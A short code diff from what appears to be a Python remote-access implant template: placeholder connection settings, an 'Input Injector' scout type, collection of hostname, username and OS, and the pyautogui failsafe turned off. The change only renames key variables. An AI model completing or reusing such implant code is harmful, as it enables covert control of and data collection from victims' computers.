@@ -5,9 +5,9 @@ from time import sleep
 
 port = !!!!!
 ip_addr = @@@@@
-server_key = #####
+lkey = #####
 End = $$$$$
-sid = %%%%%
+skey = %%%%%
 time_to_sleep = ^^^^^
 type_of_scout = 'Input Injector'
 try:
@@ -23,7 +23,7 @@ try:
 except:
     username = '?????'
 userinfo = hostname + '/' + username
-scout_data = [sid, server_key, userinfo, type_of_scout, operating_sys]
+scout_data = [skey, lkey, userinfo, type_of_scout, operating_sys]
 s = None
 pyautogui.FAILSAFE = False
 
